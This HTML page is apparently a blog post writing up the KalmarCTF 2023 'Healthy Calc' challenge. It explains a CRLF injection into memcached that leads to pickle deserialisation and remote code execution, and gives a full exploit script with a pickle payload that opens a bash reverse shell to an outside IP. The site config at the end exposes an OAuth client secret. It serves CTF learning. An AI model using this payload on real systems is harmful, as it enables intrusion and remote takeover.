@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>KalmarCTF 2023 Healthy Calc wp - kdxcxs</title><meta name="Description" content="This is my cool site"><meta property="og:title" content="KalmarCTF 2023 Healthy Calc wp" />
+<meta property="og:description" content="Healthy Calc chall overview Dockerfile:
+COPY flag /flag COPY readflag.c /readflag.c RUN gcc /readflag.c -o /readflag RUN chown root:root /flag &amp;&amp; chmod 400 /flag RUN chown root:root /readflag &amp;&amp; chmod 4755 /readflag From the dockerfile it&rsquo;s obvious we need to rce, let&rsquo;s have a look at chall.py:
+OPERATION_SYMBOLS = {&#34;add&#34;: &#34;&#43;&#34;, &#34;sub&#34;: &#34;-&#34;, &#34;mult&#34;: &#34;*&#34;} OPERATIONS = { &#34;add&#34;: lambda lhs, rhs: cache_lookup(_add, lhs, rhs), &#34;sub&#34;: lambda lhs, rhs: cache_lookup(_sub, lhs, rhs), &#34;mult&#34;: lambda lhs, rhs: cache_lookup(_mult, lhs, rhs), } application = Flask(__name__) bp = Blueprint(&#34;routes&#34;, __name__) celery = Celery(__name__) @bp." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-03-05T21:55:27+08:00" />
+<meta property="article:modified_time" content="2023-03-05T21:55:27+08:00" /><meta property="og:site_name" content="kdxcxs" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="KalmarCTF 2023 Healthy Calc wp"/>
+<meta name="twitter:description" content="Healthy Calc chall overview Dockerfile:
+COPY flag /flag COPY readflag.c /readflag.c RUN gcc /readflag.c -o /readflag RUN chown root:root /flag &amp;&amp; chmod 400 /flag RUN chown root:root /readflag &amp;&amp; chmod 4755 /readflag From the dockerfile it&rsquo;s obvious we need to rce, let&rsquo;s have a look at chall.py:
+OPERATION_SYMBOLS = {&#34;add&#34;: &#34;&#43;&#34;, &#34;sub&#34;: &#34;-&#34;, &#34;mult&#34;: &#34;*&#34;} OPERATIONS = { &#34;add&#34;: lambda lhs, rhs: cache_lookup(_add, lhs, rhs), &#34;sub&#34;: lambda lhs, rhs: cache_lookup(_sub, lhs, rhs), &#34;mult&#34;: lambda lhs, rhs: cache_lookup(_mult, lhs, rhs), } application = Flask(__name__) bp = Blueprint(&#34;routes&#34;, __name__) celery = Celery(__name__) @bp."/>
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" /><link rel="prev" href="https://kdxcxs.github.io/en/posts/wp/la-ctf-2023-wp/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "KalmarCTF 2023 Healthy Calc wp",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/kdxcxs.github.io\/en\/posts\/wp\/kalmarctf-2023-healthy-calc-wp\/"
+        },"genre": "posts","keywords": "ctf, wp","wordcount":  345 ,
+        "url": "https:\/\/kdxcxs.github.io\/en\/posts\/wp\/kalmarctf-2023-healthy-calc-wp\/","datePublished": "2023-03-05T21:55:27+08:00","dateModified": "2023-03-05T21:55:27+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "kdxcxs"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/en/" title="kdxcxs">kdxcxs&#39; blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/en/posts/"> Posts </a><a class="menu-item" href="/en/tags/"> Tags </a><a class="menu-item" href="/en/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Select Language">
+                    <i class="fa fa-globe" aria-hidden="true"></i>                      
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" selected>English</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/en/" title="kdxcxs">kdxcxs&#39; blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/en/posts/" title="">Posts</a><a class="menu-item" href="/en/tags/" title="">Tags</a><a class="menu-item" href="/en/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">
+                    <i class="fa fa-globe fa-fw" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" selected>English</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">KalmarCTF 2023 Healthy Calc wp</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/en/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>kdxcxs</a></span>&nbsp;<span class="post-category">included in <a href="/en/categories/wp/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>wp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-03-05">2023-03-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;345 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;<span id="busuanzi_container_page_pv">
+                    <i class="far fa-eye fa-fw"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>&nbsp;views
+                </span>
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            </div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#healthy-calc">Healthy Calc</a>
+      <ul>
+        <li><a href="#chall-overview">chall overview</a></li>
+        <li><a href="#memcached">memcached</a></li>
+        <li><a href="#exp">exp</a></li>
+        <li><a href="#reference">reference</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="healthy-calc">Healthy Calc</h2>
+<h3 id="chall-overview">chall overview</h3>
+<p>Dockerfile:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Dockerfile" data-lang="Dockerfile"><span class="line"><span class="cl"><span class="k">COPY</span> flag /flag<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">COPY</span> readflag.c /readflag.c<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> gcc /readflag.c -o /readflag<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:root /flag     <span class="o">&amp;&amp;</span> chmod <span class="m">400</span> /flag<span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="k">RUN</span> chown root:root /readflag <span class="o">&amp;&amp;</span> chmod <span class="m">4755</span> /readflag<span class="err">
+</span></span></span></code></pre></div><p>From the dockerfile it&rsquo;s obvious we need to rce, let&rsquo;s have a look at <code>chall.py</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">OPERATION_SYMBOLS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;add&#34;</span><span class="p">:</span> <span class="s2">&#34;+&#34;</span><span class="p">,</span> <span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;-&#34;</span><span class="p">,</span> <span class="s2">&#34;mult&#34;</span><span class="p">:</span> <span class="s2">&#34;*&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">OPERATIONS</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;add&#34;</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="n">cache_lookup</span><span class="p">(</span><span class="n">_add</span><span class="p">,</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="n">cache_lookup</span><span class="p">(</span><span class="n">_sub</span><span class="p">,</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;mult&#34;</span><span class="p">:</span> <span class="k">lambda</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="n">cache_lookup</span><span class="p">(</span><span class="n">_mult</span><span class="p">,</span> <span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">application</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bp</span> <span class="o">=</span> <span class="n">Blueprint</span><span class="p">(</span><span class="s2">&#34;routes&#34;</span><span class="p">,</span> <span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">celery</span> <span class="o">=</span> <span class="n">Celery</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@bp.route</span><span class="p">(</span><span class="s2">&#34;/calc/&lt;operation&gt;/&lt;lhs&gt;/&lt;rhs&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">calc</span><span class="p">(</span><span class="n">operation</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">lhs</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">operation</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">OPERATIONS</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;err&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;Unknown operation: </span><span class="si">{</span><span class="n">operation</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="n">OPERATIONS</span><span class="p">[</span><span class="n">operation</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;ans&#34;</span><span class="p">:</span> <span class="k">await</span> <span class="n">f</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">gp</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34; guess precision &#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">n</span><span class="p">)</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&#34;.0&#34;</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">float</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">cache_lookup</span><span class="p">(</span><span class="n">operation</span><span class="p">,</span> <span class="n">lhs</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">rhs</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">k</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">operation</span><span class="o">.</span><span class="n">name</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">lhs</span><span class="si">}</span><span class="s2">_</span><span class="si">{</span><span class="n">rhs</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">gp</span><span class="p">(</span><span class="n">celery</span><span class="o">.</span><span class="n">backend</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">pass</span>  <span class="c1"># skip cache miss</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ans</span> <span class="o">=</span> <span class="n">gp</span><span class="p">(</span><span class="k">await</span> <span class="n">operation</span><span class="p">(</span><span class="n">lhs</span><span class="p">,</span> <span class="n">rhs</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">celery</span><span class="o">.</span><span class="n">backend</span><span class="o">.</span><span class="n">set</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">ans</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ans</span>
+</span></span></code></pre></div><p>The chall code is clear and simple:</p>
+<div class="mermaid" id="id-1"></div>
+<p>But the <code>calc()</code> with <code>gp()</code> processed seems not vulnerable, so I think we should figure out a way to rce via cache.</p>
+<h3 id="memcached">memcached</h3>
+<h4 id="crlf-injection">CRLF injection</h4>
+<p>The first thing came to my mind was absolutely CRLF injection, so I tried sending request with <code>\r\n set ...</code> to set a value in memcached when checking for cache:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png"
+        data-srcset="https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png, https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png 1.5x, https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png 2x"
+        data-sizes="auto"
+        alt="https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png"
+        title="https://pics.kdxcxs.com:4433/images/2023/03/08/20230308110337.png" /></p>
+<p>Concept proved. But we need something else to trigger rce. After some digging, I found that pylibmc will load the data from memcached as pickle data(<a href="https://github.com/lericson/pylibmc/blob/1.6.3/src/_pylibmcmodule.h#L75" target="_blank" rel="noopener noreffer ">source</a>), so we just need to add the pickle payload into memcached with flag set to 1 could trigger the rce.</p>
+<h3 id="exp">exp</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">endpoint</span> <span class="o">=</span> <span class="s1">&#39;http://healthy-calc.chal-kalmarc.tf:8080&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pickle_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;I0</span><span class="se">\n</span><span class="s2">p0</span><span class="se">\n</span><span class="s2">0S&#39;bash -c </span><span class="se">\\</span><span class="s2">&#39;</span><span class="se">{{</span><span class="s2">echo,</span><span class="si">{</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/1.15.5.67/4444 0&gt;&amp;1&#39;</span><span class="p">)</span><span class="si">}</span><span class="se">}}</span><span class="s2">|</span><span class="se">{{</span><span class="s2">base64,-d</span><span class="se">}}</span><span class="s2">|</span><span class="se">{{</span><span class="s2">bash,-i</span><span class="se">}}\\</span><span class="s2">&#39;&#39;</span><span class="se">\n</span><span class="s2">p1</span><span class="se">\n</span><span class="s2">0(g0</span><span class="se">\n</span><span class="s2">lp2</span><span class="se">\n</span><span class="s2">0(I0</span><span class="se">\n</span><span class="s2">tp3</span><span class="se">\n</span><span class="s2">0(g3</span><span class="se">\n</span><span class="s2">I0</span><span class="se">\n</span><span class="s2">dp4</span><span class="se">\n</span><span class="s2">0cos</span><span class="se">\n</span><span class="s2">system</span><span class="se">\n</span><span class="s2">p5</span><span class="se">\n</span><span class="s2">0g5</span><span class="se">\n</span><span class="s2">(g1</span><span class="se">\n</span><span class="s2">tR.&#34;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">join</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/calc/add/666/666&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quote</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;set uwsgi_file__app_chall._add_777_777 1 0 </span><span class="si">{</span><span class="nb">len</span><span class="p">(</span><span class="n">pickle_payload</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="n">quote</span><span class="p">(</span><span class="n">pickle_payload</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># write payload to memcached</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># trrigger the payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">endpoint</span> <span class="o">+</span> <span class="s1">&#39;/calc/add/777/777&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><h3 id="reference">reference</h3>
+<ul>
+<li><a href="https://github.com/lericson/pylibmc/tree/1.6.3" target="_blank" rel="noopener noreffer ">lericson/pylibmc at 1.6.3 (github.com)</a></li>
+<li><a href="https://github.com/EddieIvan01/pker" target="_blank" rel="noopener noreffer ">EddieIvan01/pker: Automatically converts Python source code to Pickle opcode (github.com)</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-03-05</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" data-title="KalmarCTF 2023 Healthy Calc wp" data-hashtags="ctf,wp"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" data-hashtag="ctf"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" data-title="KalmarCTF 2023 Healthy Calc wp"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" data-title="KalmarCTF 2023 Healthy Calc wp"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://kdxcxs.github.io/en/posts/wp/kalmarctf-2023-healthy-calc-wp/" data-title="KalmarCTF 2023 Healthy Calc wp"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/en/tags/ctf/">ctf</a>,&nbsp;<a href="/en/tags/wp/">wp</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/en/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/en/posts/wp/la-ctf-2023-wp/" class="prev" rel="prev" title="LA CTF 2023 wp"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>LA CTF 2023 wp</a></div>
+</div>
+<div id="comments"><div id="gitalk" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://github.com/gitalk/gitalk"></a>Gitalk</a>.
+            </noscript></div></article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.110.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/en/" target="_blank">kdxcxs</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/mermaid@9.1.3/dist/mermaid.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{"gitalk":{"admin":["kdxcxs"],"clientID":"47d8cb8981fe47dc90a4","clientSecret":"b86af02914c7213e58c926a185bb4051e9f35760","id":"2023-03-05T21:55:27+08:00","owner":"kdxcxs","repo":"blog-comment","title":"KalmarCTF 2023 Healthy Calc wp"}},"data":{"id-1":"flowchart TD\n    REQ[request] --\u003e O{operation valid?}\n    O --\u003e |Yes| C{request cached?}\n    O --\u003e |No| R[respond]\n    C --\u003e |Yes| CA[read cache]\n    CA --\u003e R\n    C --\u003e 